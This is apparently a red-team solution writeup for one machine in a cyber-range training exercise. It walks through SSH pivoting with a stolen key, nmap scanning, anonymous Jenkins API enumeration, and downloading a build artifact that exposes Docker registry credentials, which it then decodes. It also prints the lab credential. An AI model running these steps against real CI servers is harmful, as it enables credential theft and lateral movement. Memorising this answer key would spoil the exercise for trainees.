# solve_red.md — M1 · dev-jenkins
## Red Team Solution Writeup
**Range:** RNG-DEV-01 · VIKAS TANTRA
**Machine:** M1 — Jenkins CI/CD Server
**Vulnerability:** Jenkins Anonymous Read Access + Unauthenticated Build Artifact Download
**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application) · T1552.001 (Credentials in Files)
**Severity:** Hard
**Operator:** Rudra-7 (KAAL CHAKRA CI/CD Specialist)

---

## Objective
After pivoting to the DEV zone jump host using the SSH key extracted from RNG-IT-02 M5, perform an internal subnet scan to discover services. Identify the Jenkins CI/CD server running with authentication disabled. Enumerate build jobs via the unauthenticated REST API, download the archived build artefact from the `pul-firmware-build` job, and extract the Docker registry credentials to pivot to M2.

---

## Environment

| Item | Value |
|---|---|
| Entry | SSH to `dev-jump.prabalurja.in` (`11.x.x.x`) from RNG-IT-02 M5 |
| Target IP | `11.x.x.x` (discovered via subnet scan) |
| Target Port | 8080 (HTTP) |
| Auth Required | None (useSecurity=false) |
| Pivot Artifact | `docker-config.json` in build artefact |

---

## Step-by-Step Exploitation

### Step 1 — Pivot to Jump Host and Scan

```bash
# SSH to jump host using key extracted from RNG-IT-02 M5 AWX job output
ssh -i /tmp/dev_jump_key -o StrictHostKeyChecking=no devops@11.x.x.x

# Discover hosts in the DEV zone subnet
nmap -sn 11.x.x.x/24 --open

# Port scan discovered hosts
nmap -sV -p 8080,5000,9000,9200,8888,22 11.x.x.x/24
```

<img width="1301" height="539" alt="image" src="https://github.com/user-attachments/assets/bcaffbc9-daac-4498-960f-44f256ccf83e" />


You discover port **8080** open on `11.x.x.x` — Jenkins banner confirmed.

---

### Step 2 — Confirm Unauthenticated Jenkins Access

```bash
# Test anonymous API access — no credentials sent
curl -s http://11.x.x.x:8080/api/json | python3 -m json.tool | head -20
```

<img width="1160" height="659" alt="image" src="https://github.com/user-attachments/assets/770ed92b-ab4d-45f8-be08-345c281df077" />


Response confirms `useSecurity: false` — full API access without authentication.

---

### Step 3 — Enumerate Build Jobs

```bash
# List all build jobs with artefact details
curl -s "http://11.x.x.x:8080/api/json?tree=jobs[name,url,lastBuild[result,artifacts[*]]]" \
     | python3 -m json.tool
```

<img width="2022" height="645" alt="image" src="https://github.com/user-attachments/assets/837b7162-f860-4bcd-8d34-f1c08796b871" />


Observe the job `pul-firmware-build` with last build result `SUCCESS` and archived artefacts including `deploy-bundle/docker-config.json`.

---

### Step 4 — Download Build Artefact

```bash
# Download the artefact directly
curl -s "http://11.x.x.x:8080/job/pul-firmware-build/lastSuccessfulBuild/artifact/deploy-bundle/docker-config.json" \
     -o /tmp/docker-config.json

cat /tmp/docker-config.json
```

Output:
```json
{
  "_comment": "PUL Container Registry credentials — DO NOT COMMIT TO VCS",
  "auths": {
    "11.x.x.x:5000": {
      "username": "pul-registry-svc",
      "password": "Rg5try@PUL!Bld24",
      "auth": "cHVsLXJlZ2lzdHJ5LXN2YzpSZzVyeUBQVUwhQmxkMjQ="
    }
  },
  "registry_info": {
    "endpoint": "11.x.x.x:5000",
    "purpose": "PUL firmware container registry"
  }
}
```

<img width="1639" height="619" alt="image" src="https://github.com/user-attachments/assets/9f01a76c-789a-4fbf-9ed7-c7bec088739c" />


---

### Step 5 — Verify Registry Credential

```bash
# Verify the base64 auth field
echo "cHVsLXJlZ2lzdHJ5LXN2YzpSZzVyeUBQVUwhQmxkMjQ=" | base64 -d
# Output: pul-registry-svc:Rg5try@PUL!Bld24
```

**Pivot Credential:** `pul-registry-svc : Rg5try@PUL!Bld24` → M2 Container Registry (`11.x.x.x:5000`)

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Discovery | Network Service Discovery | T1046 |
| Collection | Data from Local System | T1005 |

---

## Notes for Operator
The Jenkins console output for build #1 explicitly mentions the `docker-config.json` file placement and a TODO comment by `arun.sharma@prabalurja.in` about Vault migration. This is consistent with KAAL CHAKRA's observed TTP of exploiting shortcut credential storage in CI/CD pipelines (RedEcho campaign pattern).
